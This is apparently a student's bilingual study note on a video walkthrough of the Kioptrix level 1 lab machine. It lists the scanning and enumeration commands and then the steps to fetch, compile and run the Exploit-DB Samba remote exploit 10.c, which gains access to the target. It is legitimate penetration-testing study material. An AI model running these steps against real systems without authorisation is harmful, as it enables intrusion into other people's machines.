# KIOPTRIX lv1 # 
The video starts with this... of course previously we must make a folder and work in a folder where document our progress and discovers
sudo fping -a -g 192.168.100.0/24
![[fping.png]]

```
sudo nmap -sS -n -Pn -T4 -p-  192.168.100.32 -oN kioptrixScan
```
and then the guy did another scan 
```
sudo nmap -sV -sC -n -Pn -T4 -p 22,80,111,139,443,32768
```
(he doesnt put the sC) comand 

-T4- is for the speed

THE FIRST AND THE SECOND SCANN ARE HERE
/Documentos/Workspace/Virtual machines/pentesting/KIOPTRIX/kioptrixScan
/Documentos/Workspace/Virtual machines/pentesting/KIOPTRIX/kioptrixScan2.0

*The port 80 is open so we are going to investigate in the browser and then we will see what can tell us the apache server*

The guy used #dirbuster but it doesnt help him on the apache server

Now he is going to use #dirbuster and he will focus on the port runng smb, he need to se the version that is runing and the comand that he will use is;
enum4linux -a 192.168.100.32
*THERE IS NO DATA ABOUT smb server on the scan*

We are going to try with #metasploit

sudo msfdb start && sudo msfconsole

search type: auxiliary smb version
![[Captura de pantalla_2023-07-16_01-44-06.png]]
we are going to put "use 3" and then "show options"
set RHOST *192.168.100.32*
set *THREADS 10* (supuestamente va mas rapido pero no se que sera)
and then we use the comand *"run"*

The version is SMB 2.2.1a and we are going to search any vulnerability 
(el pibe dice que va a encontrar una vulnerabilidad contra ese protocolo, pero no es el protocolo es e "daemon"(sera la version ????)) 

lets find something with searchsploit smb 2.2.1a
![[Captura de pantalla_2023-07-16_01-59-18.png]]
This is what we have, we are going to use that that say 2.2.8

**First we are going to put us on the foler of that we are working on and then we are going to search the exploit with** 

*locate multiple/remote/10.c*

Now we are going to copy the directory to the folder that we are on

*cp /usr/share/exploitdb/exploits/multiple/remote/10.c .*

**EL TIPO DICE QUE EN LOS EXPLOIT GENERALMENTE HAY UNA OPCION PARA "COMPILAR EL PROGRAMA, PERO EN ESTE CASO NO HABIA NINGUNA, ENTONCES SIMPLEMENTE PUSO EL COMANDO 
*gcc 10.c -o samba"* (para compilar el programa con el nombre de samba)
luego obtuvo esto **

![[2 1.png]]
Now we launch it without specifications and we get this

![[3 1.png]]

Now, we are going to launch it with the next comands

./samba -b 0 -v 192.168.100.32

![[and it works.png]]

works!


